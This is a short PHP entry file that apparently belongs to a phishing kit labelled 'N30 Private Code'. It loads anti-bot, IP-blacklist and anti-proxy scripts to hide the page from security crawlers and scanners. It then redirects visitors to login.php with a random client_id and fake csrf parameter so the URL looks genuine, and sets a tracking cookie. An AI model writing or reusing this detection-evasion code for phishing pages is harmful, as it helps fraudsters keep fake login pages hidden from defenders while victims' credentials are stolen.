<?php
/**
###############################################
#$           N30 Private Code                $#
#$          Copyright 2020 Custom            $#
###############################################
**/
include 'antibots/Bot-Crawler.php';
include 'antibots/Bot-neo.php';
include 'antibots/Dila_DZ.php';
include 'antibots/IP-Blacklist.php';
include 'antibots/new.php';
/* New Anti Proxy */
include 'antiproxy/antiproxy.php';

/* New Anti Detector */
/* Prevent Detection , Simulate IDS */
if (isset($_GET['client_id'])) {}
else {
$name = 'Control'.rand(1,99999);
$om = sha1(rand(1,99999));
header('Location: login.php?client_id='.$name.'&csrf='.$om.'');}
$cliente = sha1(rand(1,999999));
setcookie('uid', $cliente, time()+31536000,'/');
?>